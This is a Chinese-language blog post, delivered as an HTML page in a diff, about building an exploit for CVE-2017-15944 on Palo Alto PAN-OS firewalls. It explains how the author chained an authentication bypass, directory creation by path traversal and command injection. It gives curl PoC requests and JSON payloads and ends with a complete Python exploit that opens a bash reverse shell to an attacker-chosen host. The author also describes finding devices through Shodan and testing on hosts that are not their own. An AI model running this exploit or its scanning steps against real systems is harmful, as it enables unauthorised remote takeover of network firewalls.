@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="在 exploit-db 看到 CVE-2017-15944 这个漏洞，三处漏洞打出的组合拳导致最后命令执行，三环缺一不可，最喜欢这样变废为宝的利用，但是在复现构造EXP还是遇到不少“坑”，本文记录一下填坑的过程&hellip;.
+exploit-db 地址 https://www.exploit-db.com/exploits/43342/
+该漏洞影响范围还是很广泛的，但是并没有看到有人放出EXP，最多只是PoC或者省去了很坑的命令执行漏洞。
+&lt;=PAN-OS 6.1.18 &lt;=PAN-OS 7.0.18 &lt;=PAN-OS 7.1.13 &lt;=PAN-OS 8.0.5 三处漏洞分别为：权限绕过，任意目录创建，命令执行
+不过命令执行部分的详细内容原作者并没有给出，只有 Payload ，而且还执行不成功，手头也没有设备，只好硬着头皮去 Shodan 找到环境，一点点摸索尝试构造 EXP
+$ shodan download search &#39;Location: /php/login.php port:&#34;4443&#34;&#39; limit 3000 $ shodan parse --fields ip_str search.json.gz 原作者给出了权限绕过的 PoC
+imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; 10.0.0.1/php/utils/debug.php &lt;!DOCTYPE html&gt; &lt;html&gt;&lt;head&gt;&lt;title&gt;Moved Temporarily&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;Moved Temporarily&lt;/h1&gt; &lt;p&gt;The document has moved &lt;a href=&#34;http://10.0.0.1:28250/php/logout.php &#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;address&gt;PanWeb Server/ - at 127.0.0.1:28250 Port 80&lt;/address&gt;&lt;/body&gt; &lt;/html&gt; imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; &#39; 10.">  
+
+  <title>
+    
+      CVE-2017-15944 Palo Alto防火墙远程代码执行构造 EXP
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.ff8eca9b0b00b45c48fc313f83495c86625933a46ab3079657980ca3c3a790edad11e6944fd08e43ee7b8f0f64d2d1d790a902ce62faa195d7133bc6598665b0.css" integrity="sha512-/47KmwsAtFxI/DE/g0lchmJZM6RqsweWV5gMo8OnkO2tEeaUT9COQ&#43;57jw9k0tHXkKkCzmL6oZXXEzvGWYZlsA==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">..</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2018-01-26 00:00:00 &#43;0000 UTC">
+            2018-01-26
+        </time>
+    </p>
+
+    <h1>CVE-2017-15944 Palo Alto防火墙远程代码执行构造 EXP</h1>
+
+    
+
+    <blockquote>
+<p>在 exploit-db 看到 CVE-2017-15944 这个漏洞，三处漏洞打出的组合拳导致最后命令执行，三环缺一不可，最喜欢这样变废为宝的利用，但是在复现构造EXP还是遇到不少“坑”，本文记录一下填坑的过程&hellip;.</p>
+</blockquote>
+<p>exploit-db 地址 <a href="https://www.exploit-db.com/exploits/43342/">https://www.exploit-db.com/exploits/43342/</a></p>
+<p>该漏洞影响范围还是很广泛的，但是并没有看到有人放出EXP，最多只是PoC或者省去了很坑的命令执行漏洞。</p>
+<pre tabindex="0"><code>&lt;=PAN-OS 6.1.18
+&lt;=PAN-OS 7.0.18
+&lt;=PAN-OS 7.1.13
+&lt;=PAN-OS 8.0.5
+</code></pre><p>三处漏洞分别为：权限绕过，任意目录创建，命令执行</p>
+<p>不过命令执行部分的详细内容原作者并没有给出，只有 Payload ，而且还执行不成功，手头也没有设备，只好硬着头皮去 Shodan 找到环境，一点点摸索尝试构造 EXP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ shodan download search <span style="color:#e6db74">&#39;Location: /php/login.php port:&#34;4443&#34;&#39;</span> limit <span style="color:#ae81ff">3000</span>
+</span></span><span style="display:flex;"><span>$ shodan parse --fields ip_str search.json.gz
+</span></span></code></pre></div><p>原作者给出了权限绕过的 PoC</p>
+<pre tabindex="0"><code>imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; 10.0.0.1/php/utils/debug.php
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;title&gt;Moved Temporarily&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Moved Temporarily&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&#34;http://10.0.0.1:28250/php/logout.php
+&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;address&gt;PanWeb Server/ -  at 127.0.0.1:28250 Port 80&lt;/address&gt;&lt;/body&gt;
+&lt;/html&gt;
+imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; &#39;
+10.0.0.1/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&#34;;user|s.&#34;1337&#34;;&#39;
+@start@Success@end@
+imac:~/pa% curl -H &#34;Cookie: PHPSESSID=hacked;&#34; 10.0.0.1/php/utils/debug.php
+2&gt;/dev/null|head -30
+&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;
+http://www.w3.org/TR/html4/loose.dtd&#34;;&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;/&gt;
+    &lt;title&gt;Debug Console&lt;/title&gt;
+</code></pre><p>这一步的漏洞详情描述最复杂，英文阅读能力跟不上看地也是云里雾里的&hellip;</p>
+<p>PoC 就很简单了，其实这个漏洞总结一句话就是可以设置任意 cookie 绕过页面的权限认证</p>
+<p>先访问 <strong>/php/utils/debug.php</strong> ，然而访问 <strong>/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&quot;;user|s.&ldquo;1337&rdquo;;</strong> 再访问**/php/utils/debug.php**便绕过了认证</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171654725.jpg" alt=""></p>
+<p>任意目录创建使用前面设置的cookie POST JSON 请求到 <strong>/php/utils/router.php/Administrator.get</strong>，如果成功便会在**/opt/pancfg/session/pan/user_tmp/{cookie value}/{jobid}.xml** 创建一个目录和临时文件，目录就是下面Payload的cookie值，可以用../跳目录，jobid 是应该是创建的任务，在response中会返回。</p>
+<pre tabindex="0"><code>{&#34;action&#34;:&#34;PanDirect&#34;,&#34;method&#34;:&#34;execute&#34;,&#34;data&#34;:
+[&#34;07c5807d0d927dcd0980f86024e5208b&#34;,&#34;Administrator.get&#34;,
+{&#34;changeMyPassword&#34;:true,&#34;template&#34;:&#34;asd&#34;,&#34;id&#34;:&#34;admin&#39;]\&#34;
+async-mode=&#39;yes&#39; refresh=&#39;yes&#39;
+cookie=&#39;../../../../../../tmp/hacked&#39;/&gt;\u0000&#34;}],&#34;type&#34;:&#34;rpc&#34;,&#34;tid&#34;:713}
+</code></pre><p>我在测试的时候遇到一个小问题，复制的payload 一直返回 ** {&ldquo;type&rdquo;:&ldquo;exception&rdquo;,&ldquo;tid&rdquo;:&quot;&quot;,&ldquo;message&rdquo;:&ldquo;Call to undefined class: &ldquo;} **，这就很尴尬了，因为我既没有设备也没有代码，只能确定这肯定是一个报错，但并不知道怎么解决。</p>
+<p>emmmm，检查之后发现一处“坑”</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171655367.jpg" alt=""></p>
+<p>标红线的位置应该要有空格的，但是由于是copy的原因，空格可能就被换行替代了</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171655712.jpg" alt=""></p>
+<p>如果看到这样的response返回那么就是成功了</p>
+<p>其实命令执行漏洞也要配合这里任意创建目录才能完成攻击，但是最关键的细节却被原隐藏了</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171655847.jpg" alt=""></p>
+<p>大概知道环境是crontab 执行脚本，两个脚本之间调用（genindex_batch.sh 调用 genindex.sh），<strong>$PAN_BASE_DIR/logdb/$dir/1</strong> 是出现漏洞的代码，大概是$dir可控，但是文中提到的find却不知道是何作用。</p>
+<p>不过好在原作者给出了EXP示例</p>
+<pre tabindex="0"><code>* -print -exec python -c exec(&#34;[base64 code..]&#34;.decode(&#34;base64&#34;)) ;
+</code></pre><p>熟悉find命令的同学肯定知道 ** -print -exec ** 的作用，不熟悉也没有关系，可以man find进行查看，</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171655026.jpg" alt="">
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171656569.jpg" alt=""></p>
+<p>猜测genindex.sh脚本使用 find 并且目录可控，不过在这里犯了一个致命的错误，因为在命令构造的时候是在终端测试，所以要加单引号双引号不然会报错，前面说过Payload是JOSN，所以又要考虑引号转义的问题，这里抓头了一阵。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171656384.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171656575.jpg" alt=""></p>
+<p>意识到错误之后便在sh脚本中测试命令，因为这里是隐式的命令执行，所以要利用oob的方式进行验证，要注意命令并不会立即执行，因为存在命令执行的文件是genindex.sh，而且是 genindex_batch.sh 进行调用，genindex_batch.sh 又是crontab 每隔15分钟执行一次，所以到等触发时间，这里需要注意命令可能会被多次执行，拿到shell看到源码才知道原来命令执行的地方是一个for循环。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171656090.jpg" alt="">
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/202402171657249.jpg" alt=""></p>
+<p>ok，可以尝试一下写webshell，直接执行echo肯定是不行的，特殊符号问题。</p>
+<p>所以要使用编码，原作者也是使用的这种方式，不过编码有一个特别不好的地方是长度会增加，因为这里是其实是创建文件夹，Linux文件名称最长可支持到255个字符(characters)</p>
+<p>漏洞发现者是写webshell拿到的权限，这样权限是nobody，属于低权限，想要root权限就用反弹shell</p>
+<p>下面给出 EXP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># encoding: utf-8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">step3_exp</span>(lhost, lport):
+</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(<span style="color:#e6db74">&#39;&#39;&#39;exec(&#34;import os; os.system(&#39;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> 0&gt;&amp;1&#39;)&#34;)&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(lhost, lport))
+</span></span><span style="display:flex;"><span>    exp_post <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;{&#34;action&#34;:&#34;PanDirect&#34;,&#34;method&#34;:&#34;execute&#34;,&#34;data&#34;:[&#34;07c5807d0d927dcd0980f86024e5208b&#34;,&#34;Administrator.get&#34;,{&#34;changeMyPassword&#34;:true,&#34;template&#34;:&#34;asd&#34;,&#34;id&#34;:&#34;admin&#39;]\&#34; async-mode=&#39;yes&#39; refresh=&#39;yes&#39;  cookie=&#39;../../../../../../../../../tmp/* -print -exec python -c exec(\&#34;&#39;&#39;&#39;</span><span style="color:#f92672">+</span> command <span style="color:#f92672">+</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;\&#34;.decode(\&#34;base64\&#34;)) ;&#39;/&gt;\u0000&#34;}],&#34;type&#34;:&#34;rpc&#34;,&#34;tid&#34;: 713}&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> exp_post
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target, port):
+</span></span><span style="display:flex;"><span>    step1_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/php/utils/debug.php&#39;</span><span style="color:#f92672">.</span>format(target, port)
+</span></span><span style="display:flex;"><span>    step2_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27&#34;;user|s.&#34;1337&#34;;&#39;</span><span style="color:#f92672">.</span>format(target, port)
+</span></span><span style="display:flex;"><span>    step3_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/php/utils/router.php/Administrator.get&#39;</span><span style="color:#f92672">.</span>format(target, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>get(step1_url, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>get(step2_url, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>                r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(step1_url, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Debug Console&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#39;[+] bypass success&#39;</span>
+</span></span><span style="display:flex;"><span>            lhost <span style="color:#f92672">=</span> raw_input(<span style="color:#e6db74">&#39;[*] LHOST: &#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> lhost:
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#39;[+] set LHOST = </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(lhost)
+</span></span><span style="display:flex;"><span>                lport <span style="color:#f92672">=</span> raw_input(<span style="color:#e6db74">&#39;[*] LPORT: &#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#e6db74">&#39;[!] LHOST invalid&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> lport:
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#39;[+] set LPORT = </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(lport)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#e6db74">&#39;[!] LPORT invalid&#39;</span>)
+</span></span><span style="display:flex;"><span>            exp_post <span style="color:#f92672">=</span> step3_exp(lhost, lport)
+</span></span><span style="display:flex;"><span>            rce <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(step3_url, data<span style="color:#f92672">=</span>exp_post)<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> rce[<span style="color:#e6db74">&#39;result&#39;</span>][<span style="color:#e6db74">&#39;@status&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;success&#39;</span>:
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#39;[+] success, please wait ... &#39;</span>
+</span></span><span style="display:flex;"><span>                print <span style="color:#e6db74">&#39;[+] jobID: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(rce[<span style="color:#e6db74">&#39;result&#39;</span>][<span style="color:#e6db74">&#39;result&#39;</span>][<span style="color:#e6db74">&#39;job&#39;</span>])
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#e6db74">&#39;[!] fail&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#e6db74">&#39;[!] bypass fail&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, err:
+</span></span><span style="display:flex;"><span>        print err
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>:
+</span></span><span style="display:flex;"><span>        exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#e6db74">&#39;[+] usage: python CVE_2017_15944_EXP.py IP PORT&#39;</span>)
+</span></span></code></pre></div>
+</article>
+
+            </div>
+        </main>
+    </body></html>
